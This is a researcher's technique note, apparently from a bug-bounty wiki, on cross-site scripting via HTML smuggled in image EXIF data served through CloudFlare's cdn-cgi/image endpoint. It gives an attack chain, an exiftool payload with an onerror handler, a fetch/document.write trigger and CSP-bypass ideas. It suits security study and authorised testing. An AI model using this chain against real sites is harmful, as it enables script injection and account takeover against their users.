---
title: CloudFlare `cdn-cgi/image` EXIF-smuggled HTML XSS via same-origin fetch
slug: cloudflare-cdn-cgi-image-exif-xss
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/cdn-trick, technique/cloudflare, sink/document-write]
inbound: []
---

# CloudFlare `cdn-cgi/image` EXIF-smuggled HTML XSS via same-origin fetch

## Pattern

A target sits behind CloudFlare. CloudFlare's image-transformation
endpoint `cdn-cgi/image/<options>/<url>` proxies any image URL from an
allow-listed remote host through CloudFlare's transformer; the
response is served from the *target's* origin, so a same-origin
`fetch` plus `document.write` of the response body executes whatever
HTML the response contains.

Key behaviour: CloudFlare's image transformer copies the EXIF metadata
of the source image into the response body **without stripping HTML
characters**. An attacker uploads an image whose EXIF "comment" or
"description" tag contains an `<script>`/`<img onerror>` payload; when
the target fetches it via `cdn-cgi/image`, the payload appears in the
response body and executes on `document.write`.

Allow-list of source hosts is configured by the customer; the
researcher's chain succeeded because a *legacy* domain that allowed
uploads was still permitted by the CloudFlare configuration.

Chain shape (Kevin Mizu's bug):
1. Find a subdomain with a `fetch(url).then(r => document.writeSync(r))`
   gadget (same-origin only).
2. Find a CloudFlare-allow-listed host that hosts an attacker upload
   feature, ideally a legacy domain still listed in CF config.
3. Upload an image with HTML in EXIF.
4. Force the gadget to fetch
   `https://target/cdn-cgi/image/format=auto/https://legacy-host/upload.jpg`.
5. CSP usually blocks inline script; pair with AngularJS gadget or
   another nonce-evading vector.

## Preconditions

- Target uses CloudFlare with image-transformation enabled.
- Same-origin XSS gadget that `document.write`s a remote fetch.
- An allow-listed (or grep-misconfigured) source host accepts
  attacker uploads with permissive content sniffing.

## Detection

- `GET /cdn-cgi/image/format=auto/https://attacker.com/test.jpg`
  against the target — non-error response = transformer enabled, host
  reachable.
- Test a tiny image with embedded EXIF (`exiftool -comment='<script>'`)
  and inspect the response body raw.

## Triggering

```bash
exiftool -Comment='<img src=x onerror=alert(origin)>' payload.jpg
# upload payload.jpg to a CF-allow-listed host
# then from the XSS gadget:
fetch('/cdn-cgi/image/format=auto/https://allowed-host/payload.jpg')
  .then(r => r.text())
  .then(t => document.write(t))
```

## Bypasses

- If CSP blocks inline scripts: chain via AngularJS template gadget
  loaded from the page itself.
- If CF stripped EXIF: try smuggling HTML in PNG `tEXt` chunks or
  SVG content; SVG sometimes routes through a non-stripping path.

## Seen in the wild

- {date: 2025-02-20, source: CT Ep 111} — Kevin Mizu used this as the XSS
  half of a chained ATO; brute-forced the CF source-host allow-list
  with the Tranco top-100, found a legacy domain still listed,
  uploaded an image with HTML-in-EXIF.

## References

- CloudFlare cdn-cgi/image transformation docs
- mizu.re — chained ATO writeup
- Critical Thinking Podcast Ep 111
- Related: [[../server-side/web-cache-deception]], [[dompurify-pi-bypass]]
